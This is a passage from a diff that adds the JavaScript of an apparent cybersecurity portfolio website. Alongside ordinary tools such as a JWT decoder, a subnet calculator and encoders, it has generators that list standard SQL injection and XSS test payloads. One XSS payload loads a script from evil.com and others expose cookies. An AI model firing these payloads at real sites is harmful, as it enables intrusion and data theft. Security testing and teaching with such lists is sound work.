+<h4 style="color:#E95420;margin:16px 0 12px">📦 Payload<\/h4>
+<pre style="background:rgba(0,0,0,0.3);padding:12px;border-radius:8px;overflow-x:auto;font-size:12px;color:var(--text)">${JSON.stringify(payload,null,2)}</pre>
+
+<h4 style="color:#E95420;margin:16px 0 12px">✍️ Signature<\/h4>
+<pre style="background:rgba(0,0,0,0.3);padding:12px;border-radius:8px;overflow-x:auto;font-size:12px;color:var(--text)">${signature}</pre>
+
+${payload.exp?`<div style="margin-top:12px;padding:12px;background:rgba(233,84,32,0.1);border:1px solid rgba(233,84,32,0.3);border-radius:8px;font-size:12px">
+⏰ <strong>Expiration:<\/strong> ${new Date(payload.exp*1000).toLocaleString()}
+<\/div>`:''}
+<\/div>
+`;
+
+showNotification('JWT Decoder','Token decoded successfully');
+}catch(e){
+document.getElementById('jwtOutput').innerHTML=`
+<div style="padding:16px;background:rgba(255,0,110,0.1);border:1px solid rgba(255,0,110,0.3);border-radius:8px;color:#FF006E">
+❌ Error: Invalid JWT format. Please check your token.
+<\/div>
+`;
+showNotification('JWT Decoder','Invalid token format');
+}
+}
+
+function generateSQLPayloads(type){
+const output=document.getElementById('sqlOutput');
+let payloads=[];
+
+switch(type){
+case 'basic':
+payloads=[
+"' OR '1'='1",
+"' OR '1'='1' --",
+"' OR '1'='1' /*",
+"admin' --",
+"admin' #",
+"' or 1=1--",
+"' or 1=1#",
+"' or 1=1/*",
+"') or '1'='1--",
+"') or ('1'='1--"
+];
+break;
+case 'union':
+payloads=[
+"' UNION SELECT NULL--",
+"' UNION SELECT NULL,NULL--",
+"' UNION SELECT NULL,NULL,NULL--",
+"' UNION SELECT username,password FROM users--",
+"' UNION ALL SELECT NULL,NULL,NULL--",
+"' UNION SELECT @@version--",
+"' UNION SELECT database()--",
+"' UNION SELECT table_name FROM information_schema.tables--"
+];
+break;
+case 'blind':
+payloads=[
+"' AND '1'='1",
+"' AND '1'='2",
+"' AND SUBSTRING(version(),1,1)='5",
+"' AND LENGTH(database())>5--",
+"' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--"
+];
+break;
+case 'timebased':
+payloads=[
+"'; WAITFOR DELAY '00:00:05'--",
+"'; SELECT SLEEP(5)--",
+"' AND SLEEP(5)--",
+"' OR SLEEP(5)--",
+"'; BENCHMARK(5000000,MD5('test'))--"
+];
+break;
+}
+
+output.value=`SQL Injection Test Payloads - ${type.toUpperCase()}\n`;
+output.value+=`${'='.repeat(50)}\n\n`;
+payloads.forEach((p,i)=>{
+output.value+=`${i+1}. ${p}\n`;
+});
+output.value+=`\n${'='.repeat(50)}\n`;
+output.value+=`Total Payloads: ${payloads.length}\n\n`;
+output.value+=`⚠️ Use only on authorized targets!\n`;
+
+showNotification('SQL Tester',`Generated ${payloads.length} ${type} payloads`);
+}
+
+function generateXSSPayloads(type){
+const output=document.getElementById('xssOutput');
+let payloads=[];
+
+switch(type){
+case 'basic':
+payloads=[
+'<' + 'script>alert(\'XSS\')<' + '/script>',
+'<' + 'script>alert(document.cookie)<' + '/script>',
+'<' + 'script>alert(document.domain)<' + '/script>',
+'<' + 'script>console.log(\'XSS\')<' + '/script>',
+'<' + 'script src="http://evil.com/xss.js"><' + '/script>'
+];
+break;
+case 'eventhandler':
+payloads=[
+'<' + 'img src=x onerror=alert(\'XSS\')>',
+'<' + 'body onload=alert(\'XSS\')>',
+'<' + 'input onfocus=alert(\'XSS\') autofocus>',
+'<' + 'select onfocus=alert(\'XSS\') autofocus>',
+'<' + 'textarea onfocus=alert(\'XSS\') autofocus>',
+'<' + 'div onmouseover=alert(\'XSS\')>Hover me<' + '/div>'
+];
+break;
+case 'img':
+payloads=[
+'<' + 'img src=x onerror=alert(\'XSS\')>',
+'<' + 'img src=javascript:alert(\'XSS\')>',
+'<' + 'img dynsrc=javascript:alert(\'XSS\')>',
+'<' + 'img lowsrc=javascript:alert(\'XSS\')>'
+];
+break;
+case 'bypass':
+payloads=[
+'<' + 'scr' + '<' + 'script' + '>' + 'ipt>alert(\'XSS\')<' + '/scr' + '<' + '/script' + '>' + 'ipt>',
+'<' + 'ScRiPt>alert(\'XSS\')<' + '/sCrIpT>',
+'<' + 'script>al\\u0065rt(\'XSS\')<' + '/script>',
+'<' + 'svg onload=alert(\'XSS\')>',
+'<' + 'iframe src=javascript:alert(\'XSS\')>',
+'<' + 'details open ontoggle=alert(\'XSS\')>'
+];
+break;
+}
+
+output.value='XSS Test Payloads - ' + type.toUpperCase() + '\n';
+output.value+='==================================================\n\n';
+payloads.forEach((p,i)=>{
+output.value+=(i+1) + '. ' + p + '\n';
+});
+output.value+='\n==================================================\n';
+output.value+='Total Payloads: ' + payloads.length + '\n\n';
+output.value+='⚠️ Only test on systems you own!\n';
+
+showNotification('XSS Generator','Generated ' + payloads.length + ' ' + type + ' payloads');
+}
+
+function calculateNetwork(){
+const input=document.getElementById('networkInput').value.trim();
+if(!input){
+showNotification('Network Calculator','Please enter an IP/CIDR');
+return;
+}
+
+try{
+const[ip,cidr]=input.split('/');
+if(!cidr||cidr<0||cidr>32){
+throw new Error('Invalid CIDR');
+}
+
+const ipParts=ip.split('.').map(Number);
+if(ipParts.length!==4||ipParts.some(p=>p<0||p>255)){
+throw new Error('Invalid IP');
+}
+
+const mask=32-parseInt(cidr);
+const totalHosts=Math.pow(2,mask);
+const usableHosts=totalHosts-2;
+
+const ipInt=(ipParts[0]<<24)+(ipParts[1]<<16)+(ipParts[2]<<8)+ipParts[3];
+const maskInt=-1<<mask;
+const networkInt=ipInt&maskInt;
+const broadcastInt=networkInt|~maskInt;
+
+const network=[(networkInt>>>24)&255,(networkInt>>>16)&255,(networkInt>>>8)&255,networkInt&255].join('.');
+const broadcast=[(broadcastInt>>>24)&255,(broadcastInt>>>16)&255,(broadcastInt>>>8)&255,broadcastInt&255].join('.');
+const firstHost=[(networkInt>>>24)&255,(networkInt>>>16)&255,(networkInt>>>8)&255,(networkInt&255)+1].join('.');
+const lastHost=[(broadcastInt>>>24)&255,(broadcastInt>>>16)&255,(broadcastInt>>>8)&255,(broadcastInt&255)-1].join('.');
+const subnetMask=[((maskInt>>>24)&255),((maskInt>>>16)&255),((maskInt>>>8)&255),(maskInt&255)].join('.');
+
+document.getElementById('networkOutput').innerHTML=`
+<div style="padding:20px;background:rgba(26,31,58,0.6);border:1px solid rgba(233,84,32,0.3);border-radius:12px">
+<h4 style="color:#E95420;margin-bottom:16px">Network Information<\/h4>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;font-size:13px">
+<div><strong style="color:#E95420">Network Address:<\/strong><\/div><div>${network}/${cidr}<\/div>
+<div><strong style="color:#E95420">Subnet Mask:<\/strong><\/div><div>${subnetMask}<\/div>
+<div><strong style="color:#E95420">First Host:<\/strong><\/div><div>${firstHost}<\/div>
+<div><strong style="color:#E95420">Last Host:<\/strong><\/div><div>${lastHost}<\/div>
+<div><strong style="color:#E95420">Broadcast:<\/strong><\/div><div>${broadcast}<\/div>
+<div><strong style="color:#E95420">Total Hosts:<\/strong><\/div><div>${totalHosts}<\/div>
+<div><strong style="color:#E95420">Usable Hosts:<\/strong><\/div><div>${usableHosts}<\/div>
+<div><strong style="color:#E95420">CIDR Notation:<\/strong><\/div><div>/${cidr}<\/div>
+<\/div>
+<\/div>
+`;
+
+showNotification('Network Calculator','Calculation complete');
+}catch(e){
+document.getElementById('networkOutput').innerHTML=`
+<div style="padding:16px;background:rgba(255,0,110,0.1);border:1px solid rgba(255,0,110,0.3);border-radius:8px;color:#FF006E">
+❌ Error: Invalid IP/CIDR format. Use format: 192.168.1.0/24
+<\/div>
+`;
+showNotification('Network Calculator','Invalid format');
+}
+}
+
+// Switch between tool tabs
+document.querySelectorAll('.encoder-tab').forEach(tab=>{
+tab.addEventListener('click',()=>{
+document.querySelectorAll('.encoder-tab').forEach(t=>t.classList.remove('active'));
+document.querySelectorAll('.encoder-section').forEach(s=>s.classList.remove('active'));
+tab.classList.add('active');
+const toolId='tool-'+tab.dataset.tab;
+document.getElementById(toolId).classList.add('active');
+});
+});
+
+// Encoder/Decoder Functions
+function switchEncoderTab(tab){
+document.querySelectorAll('.encoder-tab').forEach(t=>t.classList.remove('active'));
+document.querySelectorAll('.encoder-section').forEach(s=>s.classList.remove('active'));
+document.querySelector(`.encoder-tab[data-tab="${tab}"]`).classList.add('active');
+document.getElementById('tab-'+tab).classList.add('active');
+}
+
+document.querySelectorAll('.encoder-tab').forEach(tab=>{
+tab.addEventListener('click',()=>switchEncoderTab(tab.dataset.tab));
+});
+
+function encodeBase64(){
+const input=document.getElementById('base64Input').value;
+document.getElementById('base64Output').value=btoa(input);
+}
+
+function decodeBase64(){
+try{
+const input=document.getElementById('base64Input').value;
+document.getElementById('base64Output').value=atob(input);
+}catch(e){
+showNotification('Error','Invalid Base64 input');
+}
+}
+
+function encodeURL(){
+const input=document.getElementById('urlInput').value;
+document.getElementById('urlOutput').value=encodeURIComponent(input);
+}
+
+function decodeURL(){
+try{
+const input=document.getElementById('urlInput').value;
+document.getElementById('urlOutput').value=decodeURIComponent(input);
+}catch(e){
+showNotification('Error','Invalid URL encoding');
+}
+}
+
+async function hashSHA1(){
+const input=document.getElementById('hashInput').value;
+const buffer=new TextEncoder().encode(input);
+const hashBuffer=await crypto.subtle.digest('SHA-1',buffer);
+const hashArray=Array.from(new Uint8Array(hashBuffer));
+const hashHex=hashArray.map(b=>b.toString(16).padStart(2,'0')).join('');
+document.getElementById('hashOutput').value=hashHex;
+}
+
+async function hashSHA256(){
+const input=document.getElementById('hashInput').value;
+const buffer=new TextEncoder().encode(input);
+const hashBuffer=await crypto.subtle.digest('SHA-256',buffer);
+const hashArray=Array.from(new Uint8Array(hashBuffer));
+const hashHex=hashArray.map(b=>b.toString(16).padStart(2,'0')).join('');
+document.getElementById('hashOutput').value=hashHex;
+}
+
+function toHex(){
+const input=document.getElementById('hexInput').value;
+const hex=Array.from(input).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
+document.getElementById('hexOutput').value=hex;
+}
+
+function fromHex(){
+try{
+const input=document.getElementById('hexInput').value.replace(/\s/g,'');
+const text=input.match(/.{1,2}/g).map(byte=>String.fromCharCode(parseInt(byte,16))).join('');
+document.getElementById('hexOutput').value=text;
+}catch(e){
+showNotification('Error','Invalid hex input');
+}
+}
+
+function copyResult(outputId){
+const output=document.getElementById(outputId);
+output.select();
+document.execCommand('copy');
+showNotification('Copied','Result copied to clipboard');
+}
+
+// Browser Functions
+let browserHistory=[];
+let browserHistoryIndex=-1;
+let lastAttemptedURL='';
+
+function loadURLInBrowser(url){
+if(!url||url==='about:blank'){
+document.getElementById('browserFrame').src='about:blank';
+document.getElementById('browserURL').value='';
+return;
+}
+
+lastAttemptedURL=url;
+if(!url.startsWith('http://')&&!url.startsWith('https://')){
+url='https://'+url;
+}
+
+const frame=document.getElementById('browserFrame');
+const loading=document.getElementById('browserLoading');
+const error=document.getElementById('browserError');
+
+loading.classList.add('show');
+error.classList.remove('show');
+frame.style.display='none';
+
+document.getElementById('browserURL').value=url;
+
+if(browserHistoryIndex===-1||browserHistory[browserHistoryIndex]!==url){
+browserHistory=browserHistory.slice(0,browserHistoryIndex+1);
+browserHistory.push(url);
+browserHistoryIndex=browserHistory.length-1;
+}
+
+const loadTimeout=setTimeout(()=>{
+loading.classList.remove('show');
+error.classList.add('show');
+},20000);
+
+frame.onload=()=>{
+clearTimeout(loadTimeout);
+loading.classList.remove('show');
+frame.style.display='block';
+};
+
+frame.onerror=()=>{
+clearTimeout(loadTimeout);
+loading.classList.remove('show');
+error.classList.add('show');
+};
+
+frame.src=url;
+}
+
+function openExternal(){
+if(lastAttemptedURL){
+window.open(lastAttemptedURL,'_blank','noopener,noreferrer');
+}
+}
+
+document.getElementById('browserGo').addEventListener('click',()=>{
+const url=document.getElementById('browserURL').value.trim();
+if(url)loadURLInBrowser(url);
+});
+
+document.getElementById('browserURL').addEventListener('keypress',e=>{
+if(e.key==='Enter'){
+const url=document.getElementById('browserURL').value.trim();
+if(url)loadURLInBrowser(url);
+}
+});
+
+document.getElementById('browserBack').addEventListener('click',()=>{
+if(browserHistoryIndex>0){
+browserHistoryIndex--;
+loadURLInBrowser(browserHistory[browserHistoryIndex]);
+}
+});
+
+document.getElementById('browserForward').addEventListener('click',()=>{
+if(browserHistoryIndex<browserHistory.length-1){
+browserHistoryIndex++;
+loadURLInBrowser(browserHistory[browserHistoryIndex]);
+}
+});
+
+document.getElementById('browserRefresh').addEventListener('click',()=>{
+if(browserHistory[browserHistoryIndex]){
+loadURLInBrowser(browserHistory[browserHistoryIndex]);
+}
+});
+
+// Intercept all external links and open in new tab (most sites block iframes)
+document.addEventListener('click',e=>{
+const link=e.target.closest('a[href]');
+if(link&&!link.href.startsWith('mailto:')&&link.href.startsWith('http')){
+// Don't intercept if it's already set to open in new tab
+if(!link.target){
+e.preventDefault();
+e.stopPropagation();
+window.open(link.href,'_blank','noopener,noreferrer');
+showNotification('Opening Link','Link opened in new tab');
+}
+}
+},true);
+
+// Settings Functions
+let soundEnabled=true;
+let notificationsEnabled=true;
+
+function toggleSound(enabled){
+soundEnabled=enabled;
+showNotification('Settings',`Sound effects ${enabled?'enabled':'disabled'}`);
+if(enabled)playBeep(800,0.1);
+}
+
+function toggleDock(enabled){
+const dock=document.querySelector('.dock');
+if(enabled){
+dock.classList.add('hidden');
+dock.addEventListener('mouseenter',()=>dock.classList.remove('hidden'));
+document.addEventListener('mousemove',e=>{
+if(e.clientY<window.innerHeight-100){
+dock.classList.add('hidden');
+}
+});
+}else{
+dock.classList.remove('hidden');
+}
+showNotification('Settings',`Dock auto-hide ${enabled?'enabled':'disabled'}`);
+}
+
+function toggleNotifications(enabled){
+notificationsEnabled=enabled;
+if(enabled){
+showNotification('Settings','Notifications enabled');
+}
+}
+
+function changeFontSize(size){
+document.getElementById('fontSizeValue').textContent=size;
+const terminalContent=document.querySelector('.terminal-window .window-content');
+if(terminalContent){
+terminalContent.style.fontSize=size+'px';
+}
+showNotification('Settings',`Font size set to ${size}px`);
+}
+
+function resetSettings(){
+document.getElementById('soundToggle').checked=true;
+document.getElementById('dockToggle').checked=false;
+document.getElementById('notifToggle').checked=true;
+document.getElementById('fontSizeSlider').value=14;
+soundEnabled=true;
+notificationsEnabled=true;
+toggleDock(false);
+changeFontSize(14);
+showNotification('Settings','All settings reset to defaults');
+}
+
+// Context Menu
+const contextMenu=document.getElementById('contextMenu');
+
+document.addEventListener('contextmenu',e=>{
+e.preventDefault();
+contextMenu.style.display='block';
+contextMenu.style.left=e.pageX+'px';
+contextMenu.style.top=e.pageY+'px';
+});
+
+document.addEventListener('click',e=>{
+if(!contextMenu.contains(e.target)){
+contextMenu.style.display='none';
+}
+});
+
+// Notifications
+function showNotification(title,message){
+if(!notificationsEnabled)return;
+const notification=document.getElementById('notification');
+document.getElementById('notificationTitle').textContent=title;
+document.getElementById('notificationMessage').textContent=message;
+notification.classList.add('show');
+setTimeout(()=>notification.classList.remove('show'),3000);
+}
+
+// Dock Auto-hide
+let dockTimer;
+const dock=document.querySelector('.dock');
+
+function hideDock(){
+if(document.getElementById('dockToggle').checked){
+dockTimer=setTimeout(()=>dock.classList.add('hidden'),2000);
+}
+}
+
+function showDock(){
+dock.classList.remove('hidden');
+clearTimeout(dockTimer);
+}
+
+document.addEventListener('mousemove',e=>{
+if(e.clientY>window.innerHeight-80){
+showDock();
+}else{
+hideDock();
+}
+});
+
+showDock();
+hideDock();
+
+// Keyboard Shortcuts
+document.addEventListener('keydown',e=>{
+if(e.ctrlKey&&e.key==='='){
+e.preventDefault();
+document.body.style.zoom=(parseFloat(document.body.style.zoom||1)+0.1).toString();
+}
+if(e.ctrlKey&&e.key==='-'){
+e.preventDefault();
+document.body.style.zoom=(parseFloat(document.body.style.zoom||1)-0.1).toString();
+}
+if(e.ctrlKey&&e.key==='0'){
+e.preventDefault();
+document.body.style.zoom='1';
+}
+if(e.altKey&&e.key==='t'){
+e.preventDefault();
+openApp('terminal');
+}
+if(e.key==='Escape'){
+const activeWindow=document.querySelector('.window.active:last-of-type');
+if(activeWindow){
+closeWindow(activeWindow.id);
+}
+}
+});
+
+// Initialize all security tool buttons after page load
+window.addEventListener('load', () => {
+console.log('🔧 Initializing security tools...');
+
+// XSS Payload Generator
+document.querySelectorAll('button[data-tool="xss"]').forEach(btn => {
+const type = btn.dataset.type;
+btn.onclick = () => {
+console.log('XSS button clicked:', type);
+generateXSSPayloads(type);
+};
+console.log('✅ Attached XSS handler:', type);
+});
+
+// SQL Payload Generator
+document.querySelectorAll('button[data-tool="sql"]').forEach(btn => {
+const type = btn.dataset.type;
+btn.onclick = () => {
+console.log('SQL button clicked:', type);
+generateSQLPayloads(type);
+};
+console.log('✅ Attached SQL handler:', type);
+});
+
+// Hash Generator
+document.querySelectorAll('button[data-tool="hash"]').forEach(btn => {
+const type = btn.dataset.type;
+btn.onclick = () => {
+console.log('Hash button clicked:', type);
+generateHash(type);
+};
+console.log('✅ Attached Hash handler:', type);
+});
+
+// Port Scanner
+document.querySelectorAll('button[data-tool="port"]').forEach(btn => {
+const type = btn.dataset.type;
+btn.onclick = () => {
+console.log('Port scanner clicked:', type);
+if(type === 'common') scanCommonPorts();
+else if(type === 'full') scanAllPorts();
+};
+console.log('✅ Attached Port scanner handler:', type);
+});
+
+// Password Analyzer
+document.querySelectorAll('button[data-tool="password"]').forEach(btn => {
+const type = btn.dataset.type;
+btn.onclick = () => {
+console.log('Password tool clicked:', type);
+if(type === 'toggle') togglePasswordVisibility();
+else if(type === 'analyze') analyzePassword();
+else if(type === 'generate') generateStrongPassword();
+};
+console.log('✅ Attached Password handler:', type);
+});
+
+// JWT Decoder
+document.querySelectorAll('button[data-tool="jwt"]').forEach(btn => {
+btn.onclick = () => {
+console.log('JWT decoder clicked');
+decodeJWT();
+};
+console.log('✅ Attached JWT handler');
+});
+
+// Network Calculator
+document.querySelectorAll('button[data-tool="network"]').forEach(btn => {
+btn.onclick = () => {
+console.log('Network calculator clicked');
+calculateNetwork();
+};
+console.log('✅ Attached Network handler');
+});
+
+// Clear buttons
+document.querySelectorAll('button[data-action="clear"]').forEach(btn => {
+const target = btn.dataset.target;
+btn.onclick = () => {
+const elem = document.getElementById(target);
+if(elem) elem.value = '';
+};
+});
+
+document.querySelectorAll('button[data-action="clear-dual"]').forEach(btn => {
+const target1 = btn.dataset.target1;
+const target2 = btn.dataset.target2;
+const isHtml = btn.dataset.html === 'true';
+btn.onclick = () => {
+const elem1 = document.getElementById(target1);
+const elem2 = document.getElementById(target2);
+if(elem1) elem1.value = '';
+if(elem2) {
+if(isHtml) elem2.innerHTML = '';
+else elem2.value = '';
+}
+};
+});
+
+// Settings toggles
+document.querySelectorAll('.toggle-switch').forEach(toggle => {
+const toggleId = toggle.dataset.toggle;
+toggle.onclick = () => {
+const checkbox = document.getElementById(toggleId);
+if(checkbox) {
+checkbox.checked = !checkbox.checked;
+if(toggleId === 'soundToggle') toggleSound(checkbox.checked);
+else if(toggleId === 'dockToggle') toggleDock(checkbox.checked);
+else if(toggleId === 'notifToggle') toggleNotifications(checkbox.checked);
+}
+};
+});
+
+// Font size slider
+const fontSlider = document.getElementById('fontSizeSlider');
+if(fontSlider) {
+fontSlider.oninput = (e) => changeFontSize(e.target.value);
+}
+
+console.log('✅ All security tools initialized!');
+console.log('✅ All settings controls initialized!');
+});
+
+// Console Easter Egg - CTF Flag
+console.log('%c🎯 CTF FLAG HIDDEN HERE!','background:#E95420;color:#fff;font-size:20px;padding:10px;border-radius:8px');
+console.log('%cWelcome to SmaRTy\'s Cybersecurity Portfolio!','background:linear-gradient(90deg,#E95420,#772953);color:#fff;font-size:16px;padding:8px;border-radius:6px');
+console.log('%cType help in terminal for available commands','color:#E95420;font-size:12px');
+</script>
+</body>
+</html>
